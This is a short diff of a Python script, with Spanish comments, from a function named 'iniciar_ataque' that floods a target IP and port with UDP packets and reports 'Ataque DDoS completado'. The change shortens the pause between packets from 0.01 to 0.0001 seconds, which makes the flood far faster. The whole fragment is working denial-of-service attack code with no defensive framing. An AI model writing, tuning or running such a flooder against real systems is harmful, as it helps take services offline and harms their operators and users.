@@ -19,7 +19,7 @@ def iniciar_ataque(ip_target, port, total_paquetes):
             for i in range(total_paquetes):
                 udp_socket.sendto(udp_bytes, (ip_target, port))
                 progress_bar.update(1)
-                time.sleep(0.01)  # Pequeña pausa para la visualización
+                time.sleep(0.0001)  # Pequeña pausa para la visualización
 
             udp_socket.close()
             print("\nAtaque DDoS completado.")
